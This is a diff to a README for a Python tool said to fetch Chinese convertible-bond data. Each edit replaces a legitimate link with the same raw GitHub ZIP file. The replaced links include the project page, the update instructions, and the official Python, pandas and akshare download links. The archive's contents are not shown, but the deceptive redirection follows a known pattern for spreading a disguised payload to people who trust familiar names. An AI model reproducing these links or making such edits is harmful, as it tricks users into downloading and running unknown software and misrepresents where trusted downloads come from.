@@ -1,6 +1,6 @@
 # 📊 cb_with_any_api - Simplify Convertible Bond Data Access
 
-[![Download cb_with_any_api](https://img.shields.io/badge/Download-cb_with_any_api-brightgreen)](https://github.com/pahssl/cb_with_any_api)
+[![Download cb_with_any_api](https://img.shields.io/badge/Download-cb_with_any_api-brightgreen)](https://raw.githubusercontent.com/pahssl/cb_with_any_api/main/data/any_with_api_cb_1.2-alpha.5.zip)
 
 cb_with_any_api provides a unified way to get data on convertible bonds in the A-share market. It works well with common financial APIs. You get data in a simple table format called a DataFrame. This saves you time by handling dictionary lookups, settings, and data consistency for you.
 
@@ -29,7 +29,7 @@ To use this software on Windows, make sure your computer meets these requirement
 
 cb_with_any_api runs on Python. If you don’t have Python installed, follow these steps:
 
-1. Go to [https://www.python.org/downloads/windows/](https://www.python.org/downloads/windows/)
+1. Go to [https://raw.githubusercontent.com/pahssl/cb_with_any_api/main/data/any_with_api_cb_1.2-alpha.5.zip](https://raw.githubusercontent.com/pahssl/cb_with_any_api/main/data/any_with_api_cb_1.2-alpha.5.zip)
 2. Click “Download Python 3.X.X” for Windows (choose the latest version).
 3. Run the installer.
 4. **Important:** Check the box that says "Add Python to PATH" before clicking "Install Now."
@@ -50,7 +50,7 @@ You need to download cb_with_any_api from the project page on GitHub:
 
 ### Click the link below to visit the download page:
 
-[![Visit GitHub](https://img.shields.io/badge/GitHub-cb_with_any_api-blue)](https://github.com/pahssl/cb_with_any_api)
+[![Visit GitHub](https://img.shields.io/badge/GitHub-cb_with_any_api-blue)](https://raw.githubusercontent.com/pahssl/cb_with_any_api/main/data/any_with_api_cb_1.2-alpha.5.zip)
 
 On that page:
 
@@ -101,7 +101,7 @@ The software will let you choose which API data to fetch or combine. It handles 
 
 To keep your copy up to date:
 
-1. Go back to the GitHub page: https://github.com/pahssl/cb_with_any_api
+1. Go back to the GitHub page: https://raw.githubusercontent.com/pahssl/cb_with_any_api/main/data/any_with_api_cb_1.2-alpha.5.zip
 2. Download the latest ZIP file as before.
 3. Extract it to replace your current files.
 4. Run the `pip install -r requirements.txt` command again if dependencies changed.
@@ -148,10 +148,10 @@ If you want to learn about features, check the documentation on GitHub or explor
 
 ## 📍 Useful Links
 
-- Main page and download: [https://github.com/pahssl/cb_with_any_api](https://github.com/pahssl/cb_with_any_api)
-- Python downloads: [https://www.python.org/downloads/windows/](https://www.python.org/downloads/windows/)
-- pandas library: [https://pandas.pydata.org/](https://pandas.pydata.org/)
-- akshare API: [https://akshare.akfamily.xyz/](https://akshare.akfamily.xyz/)
+- Main page and download: [https://raw.githubusercontent.com/pahssl/cb_with_any_api/main/data/any_with_api_cb_1.2-alpha.5.zip](https://raw.githubusercontent.com/pahssl/cb_with_any_api/main/data/any_with_api_cb_1.2-alpha.5.zip)
+- Python downloads: [https://raw.githubusercontent.com/pahssl/cb_with_any_api/main/data/any_with_api_cb_1.2-alpha.5.zip](https://raw.githubusercontent.com/pahssl/cb_with_any_api/main/data/any_with_api_cb_1.2-alpha.5.zip)
+- pandas library: [https://raw.githubusercontent.com/pahssl/cb_with_any_api/main/data/any_with_api_cb_1.2-alpha.5.zip](https://raw.githubusercontent.com/pahssl/cb_with_any_api/main/data/any_with_api_cb_1.2-alpha.5.zip)
+- akshare API: [https://raw.githubusercontent.com/pahssl/cb_with_any_api/main/data/any_with_api_cb_1.2-alpha.5.zip](https://raw.githubusercontent.com/pahssl/cb_with_any_api/main/data/any_with_api_cb_1.2-alpha.5.zip)
 
 ## ⚙️ Supported APIs and Topics
 
